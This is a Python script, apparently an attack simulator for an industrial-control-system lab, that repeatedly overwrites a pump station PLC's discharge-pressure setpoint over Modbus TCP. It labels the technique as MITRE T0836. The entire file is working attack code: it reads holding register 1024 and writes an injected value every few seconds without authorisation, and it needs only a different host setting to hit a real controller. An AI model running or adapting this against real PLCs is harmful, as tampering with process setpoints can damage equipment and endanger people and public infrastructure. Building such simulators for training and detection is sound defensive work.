import os
import time
import logging
from pymodbus.client import ModbusTcpClient

# Configure console logging for Azure Log Analytics ingestion
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# Configuration from container environment variables
PLC_HOST = os.environ.get("PLC_HOST", "pump-station-openplc")
PLC_PORT = int(os.environ.get("PLC_PORT", 502))
TARGET_SETPOINT_PSI = float(os.environ.get("TARGET_SETPOINT_PSI", 175.0))
ATTACK_INTERVAL_SEC = int(os.environ.get("ATTACK_INTERVAL_SEC", 5))

# OpenPLC Modbus Holding Register Map
HR_SETPOINT_PRESS = 1024  # HMI Target Discharge Pressure Setpoint (Scaled x10)

def execute_setpoint_attack():
    scaled_value = int(TARGET_SETPOINT_PSI * 10)
    logging.info("=" * 60)
    logging.info("ATTACK SIMULATOR ACTIVE: MITRE T0836 (Modify Parameter)")
    logging.info(f"Target PLC Host      : {PLC_HOST}:{PLC_PORT}")
    logging.info(f"Target Register       : Holding Register {HR_SETPOINT_PRESS}")
    logging.info(f"Injected Setpoint     : {TARGET_SETPOINT_PSI} psi (Raw Value: {scaled_value})")
    logging.info("=" * 60)

    while True:
        try:
            client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
            if client.connect():
                # 1. Read existing setpoint value
                read_res = client.read_holding_registers(address=HR_SETPOINT_PRESS, count=1)
                if not read_res.isError():
                    current_psi = read_res.registers[0] / 10.0
                    logging.info(f"[PRE-ATTACK] Current PLC Setpoint: {current_psi:.1f} psi")

                # 2. Issue unauthorized Modbus Write (Function Code 06)
                write_res = client.write_register(address=HR_SETPOINT_PRESS, value=scaled_value)
                if not write_res.isError():
                    logging.warning(
                        f"[ATTACK SUCCESS] Overwrote HR {HR_SETPOINT_PRESS} -> {scaled_value} ({TARGET_SETPOINT_PSI} psi)"
                    )
                else:
                    logging.error(f"[ATTACK FAILED] Modbus write error: {write_res}")

                client.close()
            else:
                logging.error(f"Failed to establish TCP socket to {PLC_HOST}:{PLC_PORT}")

        except Exception as e:
            logging.error(f"Unhandled attack error: {str(e)}")

        time.sleep(ATTACK_INTERVAL_SEC)

if __name__ == "__main__":
    execute_setpoint_attack()